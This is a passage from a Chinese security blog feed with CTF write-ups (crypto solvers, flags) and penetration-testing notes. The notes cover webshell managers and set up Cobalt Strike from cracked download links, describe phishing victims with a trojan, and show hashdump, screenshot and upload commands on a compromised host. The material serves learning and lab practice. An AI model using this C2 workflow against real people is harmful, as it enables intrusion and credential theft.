number">2</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">,</span> phi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>end <span class="token operator">*</span> inv<span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;90ee7e8df270bf5133a95ff904a059b8&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ALLES-CTF-2021"><a href="#ALLES-CTF-2021" class="headerlink" title="ALLES! CTF 2021"></a>ALLES! CTF 2021</h1><h2 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Pyimplant"><a href="#Pyimplant" class="headerlink" title="Pyimplant"></a>Pyimplant</h3><p>pyc文件隐写，直接用工具一把梭</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210904121758023.png" alt></p><pre class="line-numbers language-none"><code class="language-none">ALLES!&#123;py7h0n_byt3cod3_s3cr3ts&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p>robots文件</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210904123143069.png" alt></p><h1 id="GrabCON-CTF"><a href="#GrabCON-CTF" class="headerlink" title="GrabCON CTF"></a>GrabCON CTF</h1><h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm-up"></a>Warm-up</h3><p>多重base加密</p><pre class="line-numbers language-题目" data-language="题目"><code class="language-题目">S01ZRENXU1NJVkhGUVZKUkpaRkZNMlNLSTVKVENWU0xLVlZYQVlLVElaTkVVVlRNS0pIRkc2U1dKVkpHV01LWEtaQ1VVVENXTlJORlNVS1dOUkdGS01EVUs1S0dXVlNLS1pDWFFUQ1ROUllFT1VUTE1STFZDTUxFSk5MR1c0Q0lLWVlEQ1RDWEtWMkZNVjJWTkJKRk1SS09MQktHV05EWktKV0U0VlNOTlJTRVdWVEtLSkxWR01CUklOTEdXNUNQS05XRkVSQ1dLWkhFSVVaUk9CTUZFMjJXS1ZKVENXU0tLWlZWVVJTVUdGTEZLVkNGR0ZIVTRSU1ZQRkdXWVRTTUtOVlRLVEtTR0ZSVEFVSlFNUkdGSVZUTUs1SkZNVExaS1pWWElWMk5OTkxFNFZUS0pKTFZJUkxRSlZKR1dNS1RLTVlEU1RDVk5OMkVRVjJXSlpLRk1WTFVKTkpUQ1VTRUtaV0U0VjJTR0JORklVU1dNUkxGTVJMVUpSSldXNkNYS0lZVlVSQ1RHQVlVT1ZDRk1STUU0VktPS0ZKVENTU0VLWldGTVZLUkdGU0U2VkxMTVJNVktNS1dNRktXV09LREtFWUZVVUNWTk4yRVFVWlJPQkdGTVJLT0s1S1RBM0NNS0pWWFFTQ1hLWlNFSVZMTE1SRFZJMjIySlJMR1dUU0hLSVlWVVMyV05OU0ZHVTMySkpGRksyM0VLVklWTVVTVUtSS1hJVDJXR0JORk1WTDJKSk1GRU1DMktOTEVLUlNXS05XRU1VQ1JOTlNFT1ZEMkpGNUZPVkxMR0ZKVEFXU09LWVlVNFJTVEdGWUVJVlJRTlJKRTIyWlZKNUtHV05LR0tWTEZVVkNXTk00VUdVM0xMSkZGSzIzWUtKSldXU1NMS0lZV0dNS1JHRkpFWVZMTEpaTVZLVlNPSlJLVEE1Q1NLNUtWRVZDV0tWSEZNVVJRSVVZRk0yMkdLWkpXVVZTSktaS0RBT0tRS1FZRFNVQ1JIVTZRPT09PQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">GrabCON&#123;dayuum_s0n!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PokA©-Ball-RSA"><a href="#PokA©-Ball-RSA" class="headerlink" title="PokÃ© Ball RSA"></a>PokÃ© Ball RSA</h3><p>维纳攻击</p><pre class="line-numbers language-题目" data-language="题目"><code class="language-题目">n &#x3D; 498934084350094415783044823223130007435556803301613073259727203199325937230080661117917023582579699673759861892703348357714077684549303787581429366922208568924252052118455313229534699860304480039147103608782140303489222166267907007839021544433148286217133494762766492655602977085105487216032806292874190551319e &#x3D; 134901827939710543990222584187396847806193644190423846456160711527109836908087675183249532946675670587286594441908191054495871501233678465783530503352727362726294270065122447852357566161748618195216611965946646411519602447104878893524856862722902833460104389620397589021732407447981724307130484482495521398799c &#x3D; 100132888193232309251839777842498074992587507373917163874335385921940537055226546911990198769720313749286675018486390873216490470403470144298153410686092752282228631590006943913867497072931343354481759219425807850047083814816718302223434388744485547550941814186146959750515114700335721173624212499886218608818<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意到e很大，采用维纳攻击。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> owienern <span class="token operator">=</span> <span class="token number">498934084350094415783044823223130007435556803301613073259727203199325937230080661117917023582579699673759861892703348357714077684549303787581429366922208568924252052118455313229534699860304480039147103608782140303489222166267907007839021544433148286217133494762766492655602977085105487216032806292874190551319</span>e <span class="token operator">=</span> <span class="token number">134901827939710543990222584187396847806193644190423846456160711527109836908087675183249532946675670587286594441908191054495871501233678465783530503352727362726294270065122447852357566161748618195216611965946646411519602447104878893524856862722902833460104389620397589021732407447981724307130484482495521398799</span>c <span class="token operator">=</span> <span class="token number">100132888193232309251839777842498074992587507373917163874335385921940537055226546911990198769720313749286675018486390873216490470403470144298153410686092752282228631590006943913867497072931343354481759219425807850047083814816718302223434388744485547550941814186146959750515114700335721173624212499886218608818</span>d <span class="token operator">=</span> owiener<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">9019127052844164572606928250741960583163943438936945828390420331200602392329</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># GrabCON&#123;((^_^))&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Old-Monk’s-Password"><a href="#Old-Monk’s-Password" class="headerlink" title="Old Monk’s Password"></a>Old Monk’s Password</h3><p>一个简单的求逆的运算</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc <span class="token operator">=</span> <span class="token string">b'\x0cYUV\x02\x13\x16\x1a\x01\x04\x05C\x00\twcx|z(((%.)=K%(>'</span>enc1 <span class="token operator">=</span> <span class="token string">b'\x0bPPS\r\x0b\x02\x0f\x12\r\x03_G\t\x08yb&#125;v+--*+*8=W,>'</span>enc2 <span class="token operator">=</span> <span class="token string">b'\x07A[\x06\\\r\x15\t\x04\x07\x18VG]U]@\x02\x08&amp;9&amp;%\' 41".;'</span><span class="token keyword">import</span> codecs<span class="token keyword">import</span> random<span class="token triple-quoted-string string">"""class pass_w:    x = "hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"    def encode(self, text, i=-1):        if i &lt; 0 or i > len(self.x) + 1:            i = random.randint(0, len(self.x) + 1)        out = chr(i)        for c in text:            out += chr(ord(c) ^ ord(self.x[i]))            i = (i + 1) % 79        return codecs.encode(out)y = pass_w()print(y.encode("REDACTED"))# Enclose password within GrabCON&#123;&#125;"""</span>x <span class="token operator">=</span> <span class="token string">"hjlgyjgyj10hadanvbwdmkw00OUONBADANKHM;IMMBMZCNihaillm"</span>i <span class="token operator">=</span> <span class="token number">12</span>res <span class="token operator">=</span> <span class="token string">''</span>enc <span class="token operator">=</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">for</span> c <span class="token keyword">in</span> enc<span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># GrabCON&#123;817letmein40986728ilikeapples&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>签到</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">GrabCON&#123;welcome_to_grabcon_2021&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Discord-1"><a href="#Discord-1" class="headerlink" title="Discord"></a>Discord</h3><p>这几个签到真的离谱。。。</p><p>签到2</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="OSINT-1"><a href="#OSINT-1" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Victim-1"><a href="#Victim-1" class="headerlink" title="Victim 1"></a>Victim 1</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="冰蝎Shell管理工具"><a href="#冰蝎Shell管理工具" class="headerlink" title="冰蝎Shell管理工具"></a>冰蝎Shell管理工具</h2><h3 id="引用内容，与冰蝎的基本使用和原理"><a href="#引用内容，与冰蝎的基本使用和原理" class="headerlink" title="引用内容，与冰蝎的基本使用和原理"></a>引用内容，与冰蝎的基本使用和原理</h3><p><a href="https://www.anquanke.com/post/id/212271">冰蝎，从入门到魔改</a></p><p><a href="https://github.com/rebeyond/Behinder">官方给出的ReadMe文档</a></p><h3 id="使用方式，与冰蝎的优势和特征"><a href="#使用方式，与冰蝎的优势和特征" class="headerlink" title="使用方式，与冰蝎的优势和特征"></a>使用方式，与冰蝎的优势和特征</h3><p>因为从前的”菜刀”的流量很容易被各种工具检测到，才有了这个第二代的Shell管理工具，冰蝎是基于流量加密的Shell管理软件。冰蝎是基于Java的，所以可以跨平台使用。</p><p><strong>主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等</strong></p><p><a href="https://github.com/rebeyond/Behinder/releases">下载GitHub上冰蝎的Release版本</a></p><p>不过需要Jre的版本为1.6-1.8似乎是，我直接运行不了，就主要使用蚁剑来进行Shell管理了。</p><h2 id="蚁剑Shell管理工具"><a href="#蚁剑Shell管理工具" class="headerlink" title="蚁剑Shell管理工具"></a>蚁剑Shell管理工具</h2><p><a href="https://xz.aliyun.com/t/4000">从静态到动态打造一款免杀的antSword(蚁剑)</a></p><p>蚁剑主要使用的是编解码流量内容来进行绕过WAF，只能说与冰蝎各有千秋吧感觉，不好说谁好谁坏。</p><h2 id="哥斯拉Shell管理工具"><a href="#哥斯拉Shell管理工具" class="headerlink" title="哥斯拉Shell管理工具"></a>哥斯拉Shell管理工具</h2><p><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v3.03-godzilla">工具的下载地址</a></p><p>这个听说和冰蝎差不多，emmm，还没用过，用过之后再回来评价。</p><h2 id="Cobalt-Strike的安装与使用总结"><a href="#Cobalt-Strike的安装与使用总结" class="headerlink" title="Cobalt Strike的安装与使用总结"></a>Cobalt Strike的安装与使用总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Cobalt Strike也是一个木马后门的管理工具，但是这个木马管理工具相对于前面所说的几个网马工具功能多了很多了，很酷嘿嘿（众所周知，界面越炫酷，对系统所造成危害也就越大 ::doge:: ）。</p><p>所使用的方法一般就是钓鱼了，直接向被攻击者的邮箱发送一个具有诱惑性的邮件(根据被攻击者的喜好)，被攻击者点击木马之后木马上线成功，攻击者即可远程监控与控制被攻击者的PC。</p><p>但是，CS最重要的还是免杀，不能还没点呢，刚下载下来就被检测出自己的后门属性了，直接被杀还有什么后渗透可言。但是这方面的免杀还是要看二进制能力了，这不是我们主要研究的目标了，我们现在这里只需要了解CS马的简单使用即可。</p><p><a href="https://troyess.com/2021/05/23/%E5%88%9D%E8%AF%86CobaltStrike/">参考徐神的文章，徐神我的超人</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.ddosi.com/cobalt-strike-4-3-fix/">CS4.3的可以下载的地址(徐神强推的一个网站)</a></p><p><a href="https://anonfiles.com/bdQ7Ldtau3/cobaltstrike4.3_www.ddosi.com_rar">国外某网盘的下载链接(内容取自上面的那个网站)</a></p><p>解压密码为:<code>www.ddosi.com</code></p><pre class="line-numbers language-none"><code class="language-none">Linux下启动该工具.&#x2F;start.shsh文件里面的命令为java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*Windows下启动该工具直接点击 可执行文件exe即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><p>在自己服务器配置服务端，CS的整体架构应该像下面这样吧？</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603131230506.png" alt="image-20210603131230506"></p><p>英格力士高级不高级，嘿嘿。</p><h4 id="安装JDK1-8-0"><a href="#安装JDK1-8-0" class="headerlink" title="安装JDK1.8.0"></a>安装JDK1.8.0</h4><p>先配置部署在云服务器的总服务端吧，首先安装JDK1.8，这里只展示centos安装的jdk1.8，其他的也都挺类似的。网上教程很详细。</p><pre class="line-numbers language-none"><code class="language-none">用yum安装JDK1.查看yum库中都有哪些jdk版本(暂时只发现了openjdk)[root@localhost ~]# yum search java|grep jdkldapjdk-javadoc.x86_64 : Javadoc for ldapjdkjava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.6.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentationjava-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.7.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.8.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.8.0-openjdk-headless.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.8.0-openjdk-src.x86_64 : OpenJDK Source Bundleldapjdk.x86_64 : The Mozilla LDAP Java SDK2.选择版本,进行安装&#x2F;&#x2F;选择1.7版本进行安装[root@localhost ~]# yum install java-1.8.0-openjdk&#x2F;&#x2F;安装完之后，默认的安装目录是在: &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;3.查看java版本[root@VM-12-8-centos ~]# java -versionopenjdk version &quot;1.8.0_292&quot;OpenJDK Runtime Environment (build 1.8.0_292-b10)OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行teamserver总服务端"><a href="#运行teamserver总服务端" class="headerlink" title="运行teamserver总服务端"></a>运行teamserver总服务端</h4><pre class="line-numbers language-none"><code class="language-none">运行的方式如下chmod +x teamserver.&#x2F;teamserver vps的ip地址 连接口令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603135728701.png" alt="image-20210603135728701"></p><p>记得一定要把所有文件都传到linux里面，我开始没传完，一直报错，md忙了半小时，最后在徐神的帮助下才解决，日了。</p><h4 id="客户端连接服务端"><a href="#客户端连接服务端" class="headerlink" title="客户端连接服务端"></a>客户端连接服务端</h4><p>直接运行那个exe文件即可，里面的内容按刚才你填的内容写，然后IP地址、端口和密码必须跟刚才服务端那里保持一致，而用户名是可以随意设置的，这就是让团队使用的，就像一堆人连一个WiFi一样。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603141524952.png" alt="image-20210603141524952"></p><p>配置好的界面就像上面的这样，但是全是英语单词沃日，能看懂，但是只能看懂一点点。</p><h3 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">这里是详细的教程总结处</a></p><p>我这里只写我用到的各种东西(或者说是比较常用的东西)。</p><p><strong>工具栏</strong></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603143946539.png" alt="image-20210603143946539"></p><p>再就是要总结一下使用的流程吧</p><h4 id="生成木马后门"><a href="#生成木马后门" class="headerlink" title="生成木马后门"></a>生成木马后门</h4><p>首先就是创建后门木马程序啦，这一步也是整体的流程的关键一环，称之为最关键的一步也不为过，这一步直接关系到我们的木马能不能上线。这一步中最关键又是其中的免杀，但是免杀还不是我现在能研究的了的。</p><p><strong>如何生成后门木马程序</strong></p><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了下面的几个Listener</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144418716.png" alt="image-20210603144418716"></p><p>其中一般化使用的是上面的5个Beacon的payload</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603144755208.png" alt="image-20210603144755208"></p><p>使用TCP连接生成的payload更为简单，直接点击下面的save</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/QQ录屏20210603145725.gif" alt="QQ录屏20210603145725"></p><p>保存后门木马文件到桌面上后，可以到虚拟机里面测试木马的性能。这里开始我用的tcp(但是一开始忘开4444端口了，后来就换成http了，注意<strong>这里的4444端口是你的vps上需要开的端口，用来接收反弹shell的</strong>)，后来发现还是http好用似乎。就直接换成http了，也懒得开虚拟机了，直接在我的物理机上测试算了。</p><p>简单地测试了一下，还是可以用的</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603160232678.png" alt="dump了一下用户密码的hash值"></p><p>hash值都dump下来了，就能在本地直接使用hashcat碰撞用户的密码啦。</p><h4 id="上线后的命令"><a href="#上线后的命令" class="headerlink" title="上线后的命令"></a>上线后的命令</h4><p>下面只记录不会太多，估计只会记录<strong>常见的、炫酷的和有用的</strong>。</p><pre class="line-numbers language-none"><code class="language-none">hashdump   # 把受害者主机的用户名和密码的hash值脏下来screenshot  # 获得受害者PC的正在显示的情况的截图，估计只是模拟按键PrntScr而已<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="桌面截图"><a href="#桌面截图" class="headerlink" title="桌面截图"></a>桌面截图</h5><p><code>screenshot</code></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603161052384.png" alt="生成截图的功能"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>可以直接获得受害者主机的目录并且可以上传文件，这就方便了我们后续上传更强力的马、更针对受害者环境的马。</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603222144746.png" alt="可以看到这个jar文件就是我后来通过CS上传到我的虚拟机上的"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CS后门使我们可以后续持续对受害者网络进行攻击，具体再说怎么使用就要到实战中去了，毕竟实战才是提升自己实力的最快的途径。</p><h2 id="Shiro-反序列化综合利用工具"><a href="#Shiro-反序列化综合利用工具" class="headerlink" title="Shiro 反序列化综合利用工具"></a>Shiro 反序列化综合利用工具</h2><p><a href="https://github.com/j1anFen/shiro_attack">工具的下载地址</a>，该工具应该是基于Java的，所以可以跨平台使用。</p><h2 id="sqlmap的简单使用"><a href="#sqlmap的简单使用" class="headerlink" title="sqlmap的简单使用"></a>sqlmap的简单使用</h2><h3 id="POST类型的sql注入"><a href="#POST类型的sql注入" class="headerlink" title="POST类型的sql注入"></a>POST类型的sql注入</h3><p>利用SQLmap进行简单的post类型的注入，因为现在很多的网站都是采用post的方式进行数据传输的，所以这里尝试一下post类型的注入。</p><h4 id="利用sqlmap自动搜索表单的方式"><a href="#利用sqlmap自动搜索表单的方式" class="headerlink" title="利用sqlmap自动搜索表单的方式"></a>利用sqlmap自动搜索表单的方式</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.160.1&#x2F;sqltest&#x2F;post.php&quot; --forms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Java反序列化终极测试工具"><a href="#Java反序列化终极测试工具" class="headerlink" title="Java反序列化终极测试工具"></a>Java反序列化终极测试工具</h2><p>这个主要是java的环境不好搞，因为使用到了某些包只有特定的几个jdk版本中在使用，所以这里使用的jdk版本为<code>jdk-8u151-windows-x64.exe</code>，在国内的<a href="https://repo.huaweicloud.com/java/jdk/8u151-b12/">华为镜像站下载</a></p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210719120737197.png" alt></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="在线信息收集"><a href="#在线信息收集" class="headerlink" title="在线信息收集"></a>在线信息收集</h2><p><a href="https://blog.csdn.net/bring_coco/article/details/114485091?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-114485091.pc_agg_rank_aggregation&amp;utm_term=fofa%E7%9A%84%E8%AF%AD%E6%B3%95&amp;spm=1000.2123.3001.4430">fofa语法</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记</title>
      <link href="2021/05/28/CTF/"/>
      <url>2021/05/28/CTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。    </p><p>​    之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。</p><p>​    之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，不过这里面的url确实挺长的，如果你对我从前文章的内容感兴趣的话，请访问<a href="https://github.com/m4xlmum/a16n.github.io/">我从前的博客</a>，但是其实以前的内容也没啥，直接dump下来看好了。往后一定认真写博客，主要的是一定要备份，以前写的好多文章都没了，还是挺心疼的(还好备份还在)</p><ol><li>WEB——网络安全，主要考察一些web安全漏洞，包括SQL注入、xss、xxe、ssti、代码审计、反序列化安全、各种cms的漏洞等。</li><li>MISC——杂项，考察内容覆盖广泛，主要包含隐写术、古典密码学、压缩包、图片、编码、取证等方面。</li><li>REVERSE——逆向工程，主要考察软件破解与软件算法逆向。有时会涉及软件脱壳与动态调试。</li><li>MOBILE——移动安全，类似于逆向工程，主要考察软件破解、算法逆向、脱壳与动态调试。</li><li>CRYPTO——密码学，以”XX学”命名的肯定很难啦，主要方向有古典密码、现代密码，现代密码又可以分为流密码、分组密码、公钥密码等。</li></ol><h1 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>夹杂在众多CTF题目中的多股清流，下面分为WEB、MISC这些类的都是题目比较杂、比较多的平台上的总结。再分几个比较小的平台的写，这是第一个，界面超炫酷的HTB。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="快速传参-Emdee-five-for-life"><a href="#快速传参-Emdee-five-for-life" class="headerlink" title="快速传参-Emdee five for life"></a>快速传参-Emdee five for life</h3><p><img src="/2021/05/28/CTF/image-20210602225736815.png" alt="image-20210602225736815"></p><p><img src="/2021/05/28/CTF/image-20210602225914557.png" alt="image-20210602225914557"></p><p>第一关太简单了（一看就知道这不就是签到题嘛，靠的就是写脚本，快速传参吧），本来都懒得写了，但是本着做做也无所谓的念头还是写了个简单的脚本来搞</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5url <span class="token operator">=</span> <span class="token string">'http://46.101.33.243:31878/'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textres <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>dmd5 <span class="token operator">=</span> res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'h3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment"># 使用bs4解析网页数据</span>ymd5 <span class="token operator">=</span> md5<span class="token punctuation">(</span>dmd5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>resp2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'hash'</span><span class="token punctuation">:</span> ymd5<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>BeautifulSoup<span class="token punctuation">(</span>resp2<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><span aria-hidden="true" 